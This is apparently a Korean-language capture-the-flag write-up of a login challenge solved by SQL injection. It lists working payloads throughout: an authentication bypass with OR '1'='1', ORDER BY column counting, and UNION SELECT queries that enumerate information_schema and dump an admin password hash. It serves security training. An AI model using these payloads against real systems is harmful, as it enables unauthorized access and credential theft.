Overview

로그인 페이지가 있고, SQL Injection으로 인증을 우회하는 문제입니다.

Analysis

Initial Recon

사이트에 접속하면 심플한 로그인 폼이 있습니다. 먼저 기본적인 페이로드를 테스트합니다.

Username: admin' --
Password: anything

에러 메시지가 출력됩니다:

You have an error in your SQL syntax near '--'

MySQL 기반인 것을 확인. 백엔드 쿼리를 추측하면:

1SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

Finding the Bypass

OR 1=1 기반 bypass 시도:

admin' OR '1'='1

로그인 성공! 하지만 일반 유저 계정입니다. admin 계정이 필요합니다.

Exploitation

UNION 기반으로 컬럼 수 파악:

1' ORDER BY 1--   # 성공
2' ORDER BY 2--   # 성공
3' ORDER BY 3--   # 에러 → 컬럼 2개

테이블 목록 조회:

1' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database()--

users 테이블 발견. 컬럼 조회:

1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users'--

결과: id, username, password, is_admin

admin 유저 덤프:

1' UNION SELECT username, password FROM users WHERE is_admin=1--

admin : 5f4dcc3b5aa765d61d8327deb882cf99  (MD5 → "password")

Flag

admin/password 로 로그인하면 플래그 획득.
